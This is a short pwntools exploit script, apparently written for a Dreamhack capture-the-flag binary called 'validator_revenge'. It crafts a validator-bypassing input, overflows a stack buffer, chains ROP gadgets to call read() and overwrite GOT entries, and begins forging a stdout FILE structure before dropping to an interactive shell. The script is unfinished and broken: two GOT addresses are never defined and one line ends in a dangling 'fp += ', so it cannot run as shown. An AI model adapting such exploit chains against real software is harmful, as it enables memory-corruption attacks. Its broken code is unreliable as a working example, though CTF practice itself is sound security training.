from pwn import *

context.arch= 'x86_64'
context.update(log_level = 'debug')
#p = remote('host1.dreamhack.games', 18100)
p =  process('validator_revenge')
size = 0x88
payload = 'DREAMHACK!' + 'a' 
for x in range(0x79, 0, -1):
    payload += chr(x)
payload += chr(0xff)

addr_popRDIret = 0x0000000000400873
addr_popRSIret = 0x000000000040068b
addr_popRDXret = 0x0000000000400694
addr_rspToRSI = 0x400687
'''
0x0000000000400687 : push rbp ; mov rbp, rsp ; pop rsi ; ret
'''

elf = ELF('validator_revenge')
addr_plt_fflush = elf.plt['fflush']
addr_stdout = elf.symbols['_IO_2_1_stdout_']
addr_plt_read = elf.plt['read']

payload += 'A'*(size - len(payload))
payload += p64(addr_popRDIret) + p64(0) + p64(addr_popRSIret) + p64(addr_got_ff) + p64(addr_popRDXret)+ p64(0xe0)+ p64(addr_plt_read)
payload += p64(addr_got_memset)
raw_input('pid: ' + str(p.pid))
p.sendline(payload)


fp = p64(0x00000000fbad2084)
fp += p64(0)*(0xd8 - (10*8))
fp += 
p.interactive()
